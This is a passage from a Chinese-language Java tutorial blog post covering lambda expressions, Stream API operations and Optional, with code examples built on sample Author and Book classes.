    <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;

    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : arr) &#123;
        <span class="hljs-keyword">if</span>(intPredicate.test(i))&#123;
            System.out.println(i);
        &#125;
    &#125;
&#125;


intPrint(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IntPredicate</span>() &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> &#123;
        <span class="hljs-keyword">return</span> value % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>;
    &#125;
&#125;);

intPrint( (value -&gt; &#123;
    <span class="hljs-keyword">return</span> value % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>;
&#125;));</code></pre>



<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;R&gt; R <span class="hljs-title function_">typeCover</span><span class="hljs-params">(Function&lt;String, R&gt; function)</span>&#123;
    <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;12345&quot;</span>;
    <span class="hljs-type">R</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> function.apply(str);
    <span class="hljs-keyword">return</span> result;
&#125;        

<span class="hljs-type">Integer</span> <span class="hljs-variable">integer</span> <span class="hljs-operator">=</span> typeCover(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>&lt;String, Integer&gt;() &#123;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">apply</span><span class="hljs-params">(String s)</span> &#123;
        <span class="hljs-keyword">return</span> Integer.valueOf(s);
    &#125;
&#125;);
<span class="hljs-type">Integer</span> <span class="hljs-variable">integer1</span> <span class="hljs-operator">=</span> typeCover((s) -&gt; &#123;
    <span class="hljs-keyword">return</span> Integer.valueOf(s);
&#125;);
System.out.println(integer);</code></pre>





<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">foreachArr</span><span class="hljs-params">(IntConsumer intConsumer)</span>&#123;
    <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : arr) &#123;
        intConsumer.accept(i);
    &#125;
&#125;

foreachArr(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IntConsumer</span>() &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> &#123;
        System.out.println(value + <span class="hljs-number">2</span>);
    &#125;
&#125;);

foreachArr((value -&gt; &#123;
    System.out.println(value + <span class="hljs-number">2</span>);
&#125;));

foreachArr(System.out::println);</code></pre>

<h2 id="1-4-省略规则"><a href="#1-4-省略规则" class="headerlink" title="1.4 省略规则"></a>1.4 省略规则</h2><ul>
<li><p>参数类型可以省略</p>
</li>
<li><p>方法体只有一句代码时大括号return和唯一一句代码的分号可以省略</p>
</li>
<li><p>方法只有一个参数时小括号可以省略</p>
</li>
<li><p>以上这些规则都记不住也可以省略不记</p>
</li>
</ul>
<h1 id="2-stream"><a href="#2-stream" class="headerlink" title="2.stream"></a>2.stream</h1><h2 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h2><p>Java8的Stream使用的是函数式编程模式，如同它的名字一样，它可以被用来对集合或数组进行链状流式的操作。可以更方便的让我们<br>对集合或数组操作。</p>
<h2 id="2-2-数据准备"><a href="#2-2-数据准备" class="headerlink" title="2.2 数据准备"></a>2.2 数据准备</h2><pre><code class="hljs java">
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@EqualsAndHashCode</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Author</span> &#123;
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String introduction;
    <span class="hljs-keyword">private</span> Integer age;
    <span class="hljs-keyword">private</span> List&lt;Book&gt; bookList;
&#125;</code></pre>



<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@EqualsAndHashCode</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Book</span> &#123;
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String category;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> Double score;
    <span class="hljs-keyword">private</span> String introduction;

&#125;</code></pre>



<pre><code class="hljs java"><span class="hljs-comment">// 初始化一些数据</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Author&gt; <span class="hljs-title function_">getAuthors</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-type">Author</span> <span class="hljs-variable">author1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">1L</span>, <span class="hljs-string">&quot;杨杰炜&quot;</span>, <span class="hljs-string">&quot;my introduction 1&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-literal">null</span>);
    <span class="hljs-type">Author</span> <span class="hljs-variable">author2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">2L</span>, <span class="hljs-string">&quot;yjw&quot;</span>, <span class="hljs-string">&quot;my introduction 2&quot;</span>, <span class="hljs-number">19</span>, <span class="hljs-literal">null</span>);
    <span class="hljs-type">Author</span> <span class="hljs-variable">author3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">3L</span>, <span class="hljs-string">&quot;yjw&quot;</span>, <span class="hljs-string">&quot;my introduction 3&quot;</span>, <span class="hljs-number">14</span>, <span class="hljs-literal">null</span>);
    <span class="hljs-type">Author</span> <span class="hljs-variable">author4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">4L</span>, <span class="hljs-string">&quot;wdt&quot;</span>, <span class="hljs-string">&quot;my introduction 4&quot;</span>, <span class="hljs-number">29</span>, <span class="hljs-literal">null</span>);
    <span class="hljs-type">Author</span> <span class="hljs-variable">author5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">5L</span>, <span class="hljs-string">&quot;wtf&quot;</span>, <span class="hljs-string">&quot;my introduction 5&quot;</span>, <span class="hljs-number">12</span>, <span class="hljs-literal">null</span>);

    List&lt;Book&gt; books1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    List&lt;Book&gt; books2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    List&lt;Book&gt; books3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">// 上面是作者和书</span>
    books1.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">1L</span>, <span class="hljs-string">&quot;类别,分类啊&quot;</span>, <span class="hljs-string">&quot;书名1&quot;</span>, <span class="hljs-number">45D</span>, <span class="hljs-string">&quot;这是简介哦&quot;</span>));
    books1.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">2L</span>, <span class="hljs-string">&quot;高效&quot;</span>, <span class="hljs-string">&quot;书名2&quot;</span>, <span class="hljs-number">84D</span>, <span class="hljs-string">&quot;这是简介哦&quot;</span>));
    books1.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">3L</span>, <span class="hljs-string">&quot;喜剧&quot;</span>, <span class="hljs-string">&quot;书名3&quot;</span>, <span class="hljs-number">83D</span>, <span class="hljs-string">&quot;这是简介哦&quot;</span>));

    books2.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">5L</span>, <span class="hljs-string">&quot;天啊&quot;</span>, <span class="hljs-string">&quot;书名4&quot;</span>, <span class="hljs-number">65D</span>, <span class="hljs-string">&quot;这是简介哦&quot;</span>));
    books2.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">6L</span>, <span class="hljs-string">&quot;高效&quot;</span>, <span class="hljs-string">&quot;书名5&quot;</span>, <span class="hljs-number">89D</span>, <span class="hljs-string">&quot;这是简介哦&quot;</span>));

    books3.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">7L</span>, <span class="hljs-string">&quot;久啊&quot;</span>, <span class="hljs-string">&quot;书名6&quot;</span>, <span class="hljs-number">45D</span>, <span class="hljs-string">&quot;这是简介哦&quot;</span>));
    books3.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">8L</span>, <span class="hljs-string">&quot;高效&quot;</span>, <span class="hljs-string">&quot;书名7&quot;</span>, <span class="hljs-number">44D</span>, <span class="hljs-string">&quot;这是简介哦&quot;</span>));
    books3.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">9L</span>, <span class="hljs-string">&quot;喜剧&quot;</span>, <span class="hljs-string">&quot;书名8&quot;</span>, <span class="hljs-number">81D</span>, <span class="hljs-string">&quot;这是简介哦&quot;</span>));

    author1.setBookList(books1);
    author2.setBookList(books2);
    author3.setBookList(books3);
    author4.setBookList(books3);
    author5.setBookList(books2);

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(Arrays.asList(author1, author2, author3, author4, author5));
&#125;</code></pre>

<h2 id="2-3-快速入门"><a href="#2-3-快速入门" class="headerlink" title="2.3 快速入门"></a>2.3 快速入门</h2><h3 id="2-3-1-需求"><a href="#2-3-1-需求" class="headerlink" title="2.3.1 需求"></a>2.3.1 需求</h3><p>我们可以调用getAuthors方法获取到作家的集合。现在需要打印所有年龄小于18的作家的名字，并且要注意去重。</p>
<h3 id="2-3-2-实现"><a href="#2-3-2-实现" class="headerlink" title="2.3.2 实现"></a>2.3.2 实现</h3><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 我们可以调用getAuthors方法获取到作家的集合。现在需要打印所有年龄小于18的作家的名字，并且要注意去重。</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span>&#123;
    List&lt;Author&gt; authors = getAuthors();
    authors.stream().distinct() <span class="hljs-comment">//去重</span>
        .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">18</span>)
        .forEach(author -&gt; System.out.println(author.getName()));

&#125;
</code></pre>





<h2 id="2-4-常用操作"><a href="#2-4-常用操作" class="headerlink" title="2.4 常用操作"></a>2.4 常用操作</h2><h3 id="2-4-1-创建流"><a href="#2-4-1-创建流" class="headerlink" title="2.4.1 创建流"></a>2.4.1 创建流</h3><p>单列集合:集合对象.stream()</p>
<pre><code class="hljs java"> List&lt;Author&gt; authors = getAuthors();
Stream&lt;Author&gt; stream = authors.stream();</code></pre>

<p>数组: <code>Arrays.stream(数据)</code>或者使用<code>Stream.of</code>创建</p>
<pre><code class="hljs java">Integer[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;

Stream&lt;Integer&gt; stream = Arrays.stream(arr);
Stream&lt;Integer&gt; arr1 = Stream.of(arr);</code></pre>

<p>双列集合:转换为单列集合后创建</p>
<pre><code class="hljs java">HashMap&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
map.put(<span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;111&quot;</span>);
map.put(<span class="hljs-string">&quot;222&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>);
Stream&lt;Map.Entry&lt;String, String&gt;&gt; stream1 = map.entrySet().stream();</code></pre>



<h3 id="2-4-2-中间操作"><a href="#2-4-2-中间操作" class="headerlink" title="2.4.2 中间操作"></a>2.4.2 中间操作</h3><h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>可以对流中的元素进行条件过滤，符合条件的才能继续留在流中。</p>
<p>例子：</p>
<p>打印所有姓名长度大于2的作家姓名</p>
<pre><code class="hljs java">authors.stream().distinct() <span class="hljs-comment">//去重</span>
    .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">18</span>)
    .forEach(author -&gt; System.out.println(author.getName()));</code></pre>



<h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>对元素进行计算或转换</p>
<p>打印所有作家的姓名</p>
<pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();
Stream&lt;Author&gt; stream = authors.stream();

stream.map(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>&lt;Author, String&gt;() &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">apply</span><span class="hljs-params">(Author author)</span> &#123;
        <span class="hljs-keyword">return</span> author.getName();
    &#125;
&#125;).forEach(name -&gt; System.out.println(name));


authors.stream()
    .map(author -&gt; author.getName())
    .forEach(name -&gt; System.out.println(name));


authors.stream()
    .map(Author::getName)
    .forEach(System.out::println);</code></pre>



<h4 id="dictinct"><a href="#dictinct" class="headerlink" title="dictinct"></a>dictinct</h4><p>对流中的元素进行去重操作</p>
<p>注意: distinct方法是依赖Object的equals方法来判断是否是相同对象的。所以需要注意重新equals方法。</p>
<p>例子</p>
<p>打印所有作家的姓名，不能包含重复的元素 </p>
<pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();

authors.stream()
    .distinct()
    .forEach(author -&gt; System.out.println(author.getName())</code></pre>

<h4 id="sorted"><a href="#sorted" class="headerlink" title="sorted"></a>sorted</h4><p>对流中的元素按照规则进行排序</p>
<p>注意：如果调用空参<code>sorted()</code>方法，需要流中的元素实现了Comparable接口</p>
<p>例子</p>
<p>按照年龄排序，并且不能有重复的元素</p>
<p>升序排序</p>
<pre><code class="hljs java">authors.stream()
    .distinct()
    .sorted(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;Author&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Author o1, Author o2)</span> &#123;
            <span class="hljs-keyword">return</span> o1.getAge() - o2.getAge();
        &#125;
    &#125;)
    .forEach(author -&gt; System.out.println(author.getAge()));


authors.stream()
    .distinct()
    .sorted((o1, o2) -&gt; o1.getAge() - o2.getAge())
    .forEach(author -&gt; System.out.println(author.getAge()));
authors.stream()
    .distinct()
    .sorted(Comparator.comparingInt(Author::getAge)) <span class="hljs-comment">// 默认是升序排序 </span>
    .forEach(author -&gt; System.out.println(author.getAge()));</code></pre>

<p>降序排序</p>
<pre><code class="hljs java">authors.stream()
    .distinct()
    .sorted((o1, o2) -&gt; o2.getAge() - o1.getAge())
    .forEach(author -&gt; System.out.println(author.getAge()));</code></pre>

<h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>可以限制流的最大长度，超出部分将被抛弃</p>
<p>例如:<br>对流中的元素按照年龄进行降序排序，并且要求不能有重复的元素,然后打印其中年龄最大的两个作家的姓名。</p>
<pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();

authors.stream()
    .distinct()
    .sorted((o1, o2) -&gt; o2.getAge() - o1.getAge())
    .limit(<span class="hljs-number">2</span>)
    .forEach(author -&gt; System.out.println(author.getName()));
</code></pre>

<h4 id="skip"><a href="#skip" class="headerlink" title="skip"></a>skip</h4><p>跳过流中的前n个元素，处理剩下的元素</p>
<p>例子</p>
<p>打印除了年龄最大的作家外的其他作家，要求不能有重复元素，并且按照年龄降序排序</p>
<pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();

authors.stream()
    .distinct()
    .sorted((o1, o2) -&gt; o2.getAge() - o1.getAge())
    .skip(<span class="hljs-number">1</span>)
    .forEach(System.out::println);</code></pre>



<h4 id="flatMap"><a href="#flatMap" class="headerlink" title="flatMap"></a>flatMap</h4><p>map只能将一个对象转换成另一个对象来作为流中的元素，而<code>flatMap</code>可以把一个对象转换成多个对象作为流中的元素</p>
<p>例一</p>
<p>打印所有书籍名字，要求对重复的元素进行去重</p>
<pre><code class="hljs java">authors.stream()
    .distinct()
    .flatMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>&lt;Author, Stream&lt;Book&gt;&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Stream&lt;Book&gt; <span class="hljs-title function_">apply</span><span class="hljs-params">(Author author)</span> &#123;
            <span class="hljs-keyword">return</span> author.getBookList().stream();
        &#125;
    &#125;)
    .distinct()
    .forEach(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>&lt;Book&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Book book)</span> &#123;
            System.out.println(book.getName());
        &#125;
    &#125;);

authors.stream()
    .distinct()
    .flatMap(author -&gt; author.getBookList().stream())
    .distinct()
    .forEach(book -&gt; System.out.println(book.getName()));</code></pre>

<p>例二:<br>打印现有数据的所有分类。要求对分类进行去重。不能出现这种格式:哲学,爱情</p>
<pre><code class="hljs java">authors.stream()
    .distinct()
    .flatMap(author -&gt; author.getBookList().stream())
    .distinct()
    .flatMap(book -&gt; Arrays.stream(book.getCategory().split(<span class="hljs-string">&quot;,&quot;</span>)))
    .distinct()
    .forEach(System.out::println);</code></pre>



<h3 id="2-4-3-终结操作"><a href="#2-4-3-终结操作" class="headerlink" title="2.4.3 终结操作"></a>2.4.3 终结操作</h3><h4 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h4><p>对流中的元素进行遍历操作，我们通过传入的参数去指定对追历到的元素进行什么具体操作。</p>
<p>上面的例子中一直在使用，就不在赘述</p>
<h4 id="count"><a href="#count" class="headerlink" title="count"></a>count</h4><p>获取当前流中元素的个数</p>
<p>例子</p>
<p>打印这些作家所处书籍的数量，删除重复元素</p>
<pre><code class="hljs java"><span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> authors.stream()
    .distinct()
    .flatMap(author -&gt; author.getBookList().stream())
    .distinct()
    .count();
System.out.println(count);</code></pre>

<h4 id="max-amp-min"><a href="#max-amp-min" class="headerlink" title="max&amp;min"></a>max&amp;min</h4><p>计算流中元素的最值</p>
<p>例子</p>
<p>分别获取作家所出书籍的最高分和最低分并打印</p>
<pre><code class="hljs java">Optional&lt;Double&gt; max = authors.stream()
    .distinct()
    .flatMap(author -&gt; author.getBookList().stream())
    .distinct()
    .map(book -&gt; book.getScore())
    .max(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;Double&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Double o1, Double o2)</span> &#123;
            <span class="hljs-keyword">if</span> (o1 - o2 &gt; <span class="hljs-number">0</span>) &#123;
                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (o1 &lt; o2) &#123;
                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
            &#125;
        &#125;
    &#125;);

Optional&lt;Double&gt; min = authors.stream()
    .distinct()
    .flatMap(author -&gt; author.getBookList().stream())
    .distinct()
    .map(book -&gt; book.getScore())
    .min((o1, o2) -&gt; &#123;
        <span class="hljs-keyword">if</span> (o1 - o2 &gt; <span class="hljs-number">0</span>) &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (o1 &lt; o2) &#123;
            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
        &#125;
    &#125;);
System.out.println(max.get());
System.out.println(min.get());</code></pre>



<h4 id="collect"><a href="#collect" class="headerlink" title="collect"></a>collect</h4><p>把当前流转换成集合</p>
<p>例子</p>
<p>获取一个存放作者名字的集合</p>
<pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();
List&lt;String&gt; nameList = authors.stream()
    .distinct()
    .map(Author::getName)
    .collect(Collectors.toList());
System.out.println(nameList);</code></pre>

<p>获取所有书名的Set集合</p>
<pre><code class="hljs java">Set&lt;String&gt; nameList = authors.stream()
    .distinct()
    .flatMap((Function&lt;Author, Stream&lt;Book&gt;&gt;) author -&gt; author.getBookList().stream())
    .map(Book::getName)
    .collect(Collectors.toSet());

System.out.println(nameList);</code></pre>

<p>获取一个Map集合，key为作者名，value为<code>List&lt;Book&gt;</code></p>
<pre><code class="hljs java">Map&lt;String, List&lt;Book&gt;&gt; map = authors.stream()
    .distinct()
    .collect(Collectors.toMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>&lt;Author, String&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">apply</span><span class="hljs-params">(Author author)</span> &#123;
            <span class="hljs-keyword">return</span> author.getName();
        &#125;
    &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>&lt;Author, List&lt;Book&gt;&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> List&lt;Book&gt; <span class="hljs-title function_">apply</span><span class="hljs-params">(Author author)</span> &#123;
            <span class="hljs-keyword">return</span> author.getBookList();
        &#125;
    &#125;));
map.forEach((key, value) -&gt; System.out.println(key + <span class="hljs-string">&quot;:&quot;</span> + value));


Map&lt;String, List&lt;Book&gt;&gt; map = authors.stream()
    .distinct()
    .collect(Collectors.toMap(Author::getName, Author::getBookList));
map.forEach((key, value) -&gt; System.out.println(key + <span class="hljs-string">&quot;:&quot;</span> + value));</code></pre>



<h4 id="查找与匹配"><a href="#查找与匹配" class="headerlink" title="查找与匹配"></a>查找与匹配</h4><h5 id="anyMatch"><a href="#anyMatch" class="headerlink" title="anyMatch"></a>anyMatch</h5><p>可以用来判断是否有任意匹配符合匹配条件按的元素，返回结果是Boolean类型</p>
<p>例子判断是否有年龄在29岁以上的作家</p>
<pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-variable">anyMatch</span> <span class="hljs-operator">=</span> authors.stream().distinct()
    .anyMatch(author -&gt; author.getAge() &gt; <span class="hljs-number">30</span>);</code></pre>



<h5 id="allMatch"><a href="#allMatch" class="headerlink" title="allMatch"></a>allMatch</h5><p>可以用来判断是否都符合匹配条件，结果为boolean类型。如果都符合结果为true，否则结果为false。</p>
<pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-variable">allMatch</span> <span class="hljs-operator">=</span> authors.stream().distinct()
    .allMatch(author -&gt; author.getAge() &gt; <span class="hljs-number">10</span>);</code></pre>

<h5 id="noneMatch"><a href="#noneMatch" class="headerlink" title="noneMatch"></a>noneMatch</h5><p>可以判断流中元素是否都不符合匹配条件，如果都不符合返回true,否则返回false</p>
<pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-variable">noneMatch</span> <span class="hljs-operator">=</span> authors.stream().distinct()
    .noneMatch(author -&gt; author.getAge() &gt; <span class="hljs-number">100</span>);</code></pre>



<h5 id="findAny"><a href="#findAny" class="headerlink" title="findAny"></a>findAny</h5><p>获取流中任意一个元素，该方法没有办法保证获取的一定是流中的第一个元素</p>
<p>例子</p>
<p>获取任意一个大于18的作家，如果存在就输出他的名字</p>
<pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = authors.stream().distinct()
    .filter(author -&gt; author.getAge() &gt; <span class="hljs-number">18</span>)
    .findAny();
authorOptional.ifPresent(author -&gt; System.out.println(author.getName()));</code></pre>

<h5 id="findFirst"><a href="#findFirst" class="headerlink" title="findFirst"></a>findFirst</h5><p>获取流中任意一个元素，该方法保证获取的一定是流中的第一个元素</p>
<p> 例子</p>
<p>获取年龄最小的作家，如果存在就输出他的名字</p>
<pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = authors.stream().distinct()
    .sorted((o1, o2) -&gt; o1.getAge() - o2.getAge())
    .findFirst();
authorOptional.ifPresent(author -&gt; System.out.println(author.getName()));</code></pre>

<h5 id="reduce归并"><a href="#reduce归并" class="headerlink" title="reduce归并"></a>reduce归并</h5><p>对流中的教据按照你指定的计算方式计算出一个结果。（缩减操作）</p>
<p>reduce的作用是把stream中的元素给组合起来，我们可以传入一个初始值，它会按照我们的计算方式依次拿流中的元素和在初始化值的基础上进行计算，计算结果再和后面的元素计算。</p>
<p>例子</p>
<p>使用reduce操作求出所有作家的年龄的和</p>
<pre><code class="hljs java"><span class="hljs-type">Integer</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> authors.stream()
    .map(Author::getAge)
    .reduce(<span class="hljs-number">0</span>, (result, element) -&gt; result + element);
System.out.println(sum);</code></pre>

<p>使用reduce求所有作者中年龄的最大值</p>
<pre><code class="hljs java"><span class="hljs-type">Integer</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> authors.stream()
    .map(Author::getAge)
    .reduce(Integer.MIN_VALUE, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BinaryOperator</span>&lt;Integer&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">apply</span><span class="hljs-params">(Integer result, Integer element)</span> &#123;
            <span class="hljs-keyword">return</span> result &gt; element ? result : element;
        &#125;
    &#125;);</code></pre>



<p>使用reduce求所有作者中年龄的最小值</p>
<pre><code class="hljs java"><span class="hljs-type">Integer</span> <span class="hljs-variable">min</span> <span class="hljs-operator">=</span> authors.stream()
    .map(Author::getAge)
    .reduce(Integer.MAX_VALUE, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BinaryOperator</span>&lt;Integer&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">apply</span><span class="hljs-params">(Integer result, Integer element)</span> &#123;
            <span class="hljs-keyword">return</span> result &lt; element ? result : element;
        &#125;
    &#125;);</code></pre>

<p>reduce一个参数的重载形式内部计算</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230507161438243.png" alt="image-20230507161438243"></p>
<h3 id="2-5-注意事项"><a href="#2-5-注意事项" class="headerlink" title="2.5 注意事项"></a>2.5 注意事项</h3><ul>
<li>惰性求值(如果没有终结操作，没有中间提作是不会得到执行的)</li>
<li>流是一次性的 (一旦一个流对象经过一个终结操作后这个流就不能再被使用)</li>
<li>不会影响原数据(我们在流中可以多数据做很多处理。但是正常情况下是不会影响原来集合中的元素的。这往往也是我们期望的)</li>
</ul>
<h1 id="3-Optional"><a href="#3-Optional" class="headerlink" title="3. Optional"></a>3. Optional</h1><h2 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h2><p>我们在编写代码的时候出现最多的就是空指针异常。所以在很多情况下我们需要做各种非空的判断。</p>
<p>尤其是对象中的属性还是一个对象的情况下。这种判断会更多。而过多的判断语句会让我们的代码显得臃肿不堪。所以在IDK8中引入了Optional,养成使用Optional的习惯后你可以写出更优雅的代码来避免空指针异常并且在很多函数式编程相关的AP中也都用到了Optional，如果不会使用Optional也会对函数式编程的学习造成影响。</p>
<h2 id="3-2-使用"><a href="#3-2-使用" class="headerlink" title="3.2 使用"></a>3.2 使用</h2><h3 id="3-2-1-创建对象"><a href="#3-2-1-创建对象" class="headerlink" title="3.2.1 创建对象"></a>3.2.1 创建对象</h3><p>Optional就像是包装类，可以将我们的具体数据封装到Optional内部。然后使用optional获取数据可以非常优雅的避免空指针异常。</p>
<p>一般使用Optional的静态方法<code>ofNullable</code>把数据封装成一个Optional对象。无论传入的参数是否为null都不会出现问题</p>
<pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();
Optional&lt;List&lt;Author&gt;&gt; optionalAuthors = Optional.ofNullable(authors);</code></pre>

<p>你可能会觉得还要加一行代码来封装数据比较麻烦。但是如果改造下getAuthor方法，让其的返回值就是封装好的Optional的话，我们在使用时就会方便很多。<br>而且在实际开发中我们的数据很多是从数据库获取的。Mybatis从3.5版本可以也已经支持ptional了。我们可以直接把dao方法的返回值类型定义成Optional类型，MyBastis会自己把数据封装成Optional对象返回。封装的过程也不需要我们自己操作。</p>
